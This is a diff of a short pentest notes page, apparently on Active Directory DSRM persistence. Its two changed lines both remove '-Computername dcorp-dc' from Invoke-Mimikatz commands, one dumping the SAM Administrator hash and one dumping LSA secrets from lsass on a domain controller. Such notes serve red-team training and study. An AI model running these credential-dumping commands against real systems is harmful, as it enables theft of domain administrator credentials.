@@ -13,12 +13,12 @@ Require Domain Admin privileges
 {% endhint %}
 
 <pre class="language-powershell"><code class="lang-powershell"><strong># dumping from sam - DSRM local Administrator hash
-</strong><strong>Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
+</strong><strong>Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' 
 </strong></code></pre>
 
 ```powershell
 # dumping from lsass - Administrator hash
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
 ```
 
 
